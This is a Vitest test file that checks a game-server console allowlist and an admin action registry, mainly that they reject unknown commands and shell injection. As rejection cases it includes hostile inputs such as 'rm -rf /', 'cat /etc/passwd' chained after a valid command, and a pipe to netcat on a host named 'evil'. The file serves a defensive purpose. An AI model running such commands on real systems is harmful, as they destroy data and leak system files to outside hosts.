import { describe, it, expect } from 'vitest';
import { validateConsoleLine } from '../src/modules/console/allowlist';
import { resolveAdminAction, ADMIN_ACTIONS } from '../src/modules/admin/registry';

describe('console allowlist', () => {
  it('accepts allowlisted commands', () => {
    expect(validateConsoleLine('players').name).toBe('players');
    expect(validateConsoleLine('servermsg "hello"').name).toBe('servermsg');
  });
  it('rejects unknown commands', () => {
    expect(() => validateConsoleLine('rm -rf /')).toThrow();
    expect(() => validateConsoleLine('exec bash')).toThrow();
  });
  it('rejects destructive lifecycle commands (quit is not in the list)', () => {
    expect(() => validateConsoleLine('quit')).toThrow();
  });
  it('rejects shell metacharacters', () => {
    expect(() => validateConsoleLine('players; rm -rf /')).toThrow();
    expect(() => validateConsoleLine('players && cat /etc/passwd')).toThrow();
    expect(() => validateConsoleLine('players | nc evil 1234')).toThrow();
  });
  it('rejects empty and overly long input', () => {
    expect(() => validateConsoleLine('   ')).toThrow();
    expect(() => validateConsoleLine('players ' + 'x'.repeat(300))).toThrow();
  });
});

describe('admin action registry', () => {
  it('resolves ids and aliases', () => {
    expect(resolveAdminAction('helicopter')?.id).toBe('helicopter');
    expect(resolveAdminAction('Trigger Helicopter')?.id).toBe('helicopter');
    expect(resolveAdminAction('reloadoptions')?.id).toBe('reloadOptions');
  });
  it('returns null for unknown actions (no passthrough)', () => {
    expect(resolveAdminAction('nuke_everything')).toBeNull();
  });
  it('builds only fixed commands', () => {
    expect(ADMIN_ACTIONS.helicopter.build({})).toBe('chopper');
    expect(ADMIN_ACTIONS.createHorde.build({ count: 50 })).toBe('createhorde 50');
    expect(() => ADMIN_ACTIONS.createHorde.build({ count: 99999 })).toThrow();
  });
});
